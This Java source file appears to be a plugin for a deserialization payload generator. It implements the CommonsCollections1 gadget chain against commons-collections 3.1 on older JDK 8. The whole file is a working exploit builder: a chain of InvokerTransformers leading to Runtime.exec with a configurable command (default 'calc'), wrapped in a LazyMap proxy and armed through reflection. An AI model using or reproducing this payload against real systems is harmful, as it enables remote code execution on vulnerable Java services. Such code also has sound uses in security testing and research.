package com.ar3h.plugin.fr;

import com.ar3h.chains.common.Gadget;
import com.ar3h.chains.common.GadgetChain;
import com.ar3h.chains.common.GadgetContext;
import com.ar3h.chains.common.annotations.GadgetAnnotation;
import com.ar3h.chains.common.annotations.GadgetTags;
import com.ar3h.chains.common.param.Param;
import com.ar3h.chains.common.util.PayloadHelper;
import com.ar3h.chains.common.util.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

import static com.ar3h.chains.common.Tag.*;

/**
 * @Author se1zer
 * @Date 2024/8/17 20:49
 */
@GadgetTags(
        tags = {JavaNativeDeserialize,  END} // JavaNativeDeserialize 代表这是Java反序列化链的开始
)
@GadgetAnnotation(
        name = "CommonsCollections1",
        description = "CommonsCollections1",
        dependencies = {"commons-collections:commons-collections:3.1", "jdk<=8u71"},
        authors = {"se1zer"},
        priority = 10 // 展示顺序的优先级，默认100，数字越小越优先，会在级联选择器上方优先看到
)
public class CommonsCollections1 implements Gadget {

    @Param(name = "cmd", description = "calc")
    public String cmd = "calc";

    public Object getObject() throws Exception {
        final String[] execArgs = new String[] { cmd };
        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) };

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        final Map mapProxy = PayloadHelper.createMemoitizedProxy(lazyMap, Map.class);

        final InvocationHandler handler = PayloadHelper.createMemoizedInvocationHandler(mapProxy);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

        return handler;
    }

    @Override
    public Object invoke(GadgetContext gadgetContext, GadgetChain gadgetChain) throws Exception {
        return getObject(); // 构建并返回
    }
}
